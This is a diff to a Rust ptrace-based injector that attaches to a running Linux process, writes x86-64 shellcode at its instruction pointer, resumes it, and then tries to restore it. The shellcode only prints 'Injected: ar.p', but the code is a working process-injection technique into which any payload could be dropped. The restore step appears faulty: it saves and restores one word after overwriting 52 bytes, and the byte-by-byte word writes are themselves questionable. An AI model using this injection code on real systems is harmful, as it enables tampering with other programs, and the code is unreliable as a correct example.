@@ -2,14 +2,14 @@
 
 use sysinfo::System;
 use std::ffi::{OsStr, c_void};
-use nix::{sys::{ptrace::{self, detach, getregs, read, write, AddressType}, wait}, unistd::Pid};
+use nix::{sys::{ptrace::{self, attach, cont, detach, getregs, setregs, write, AddressType}, wait::waitpid}, unistd::Pid};
 
 // Shellcode prints "Injected: ar.p"
-const SHELLCODE: [u8; 59] = [
-                               0xb8,0x01,0x00,0x00,0x00,0x48,0xbe,0x49,0x6e,0x6a,0x65,0x63,0x74,0x65,0x64,0x56,
-                               0x48,0x89,0xe6,0xba,0x08,0x00,0x00,0x00,0x0f,0x05,0xb8,0x01,0x00,0x00,0x00,0x48,
-                               0xbe,0x3a,0x20,0x61,0x72,0x2e,0x70,0x00,0x00,0x56,0x48,0x89,0xe6,0xba,0x06,0x00,
-                               0x00,0x00,0x0f,0x05,0xb8,0x3c,0x00,0x00,0x00,0x0f,0x05                            
+// Having no exit syscall 
+const SHELLCODE: [u8; 52] = [
+                                0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xbe, 0x49, 0x6e, 0x6a, 0x65, 0x63, 0x74, 0x65, 0x64, 0x56, 0x48,
+                                0x89, 0xe6, 0xba, 0x08, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xbe, 0x3a,
+                                0x20, 0x61, 0x72, 0x2e, 0x70, 0x00, 0x00, 0x56, 0x48, 0x89, 0xe6, 0xba, 0x06, 0x00, 0x00, 0x00, 0x0f, 0x05,    
                             ];
 
 
@@ -35,14 +35,27 @@ fn THREAD(pid: i32, pname: String) {
     let pid = Pid::from_raw(pid);
 
     // Attaching to Process 
-    ptrace::attach(pid).unwrap();
+    attach(pid).unwrap();
     println!("Attaching on {:?} PID: {}", pname, pid);
 
     // Wait for Signal
-    wait::waitpid(pid, None).unwrap();
+    waitpid(pid, None).unwrap();
+    
+    // Get original registers and original instruction
+    let regs = ptrace::getregs(pid).unwrap();
+    let original_instruction = ptrace::read(pid, regs.rip as *mut c_void).unwrap();
 
     // Performing memory injection 
-    memINJECT(pid); 
+    memINJECT(pid);
+
+    // Continue the process
+    cont(pid, None).unwrap();
+    waitpid(pid, None).unwrap();
+
+    // Restoring the original instruction
+    unsafe{ ptrace::write(pid, regs.rip as *mut c_void, original_instruction as *mut c_void).unwrap() };
+    setregs(pid, regs).expect("Failed to set registers");
+    println!("{:?} process is restored sucessfully.", pname);
 
     // Detach with no signal 
     detach(pid, None).unwrap();
@@ -60,15 +73,10 @@ fn memINJECT(pid: Pid) {
     // Writing Shellcode to Process
     for byte in SHELLCODE.iter() {
         let data = *byte as *mut c_void;
-        unsafe { write(pid, rip as AddressType, data).unwrap(); }
+        unsafe{ write(pid, rip as AddressType, data).unwrap(); }
         rip += 1;
     }
-
-    // Getting address of new rip
-    let addr = getregs(pid).unwrap().rip as AddressType;
     
-    // New data
-    let _data = read(pid, addr).unwrap(); 
-    println!("Memory inject at RIP: {:#x}", _data);
+    println!("!!! Shellcode injected !!!");
 
 }
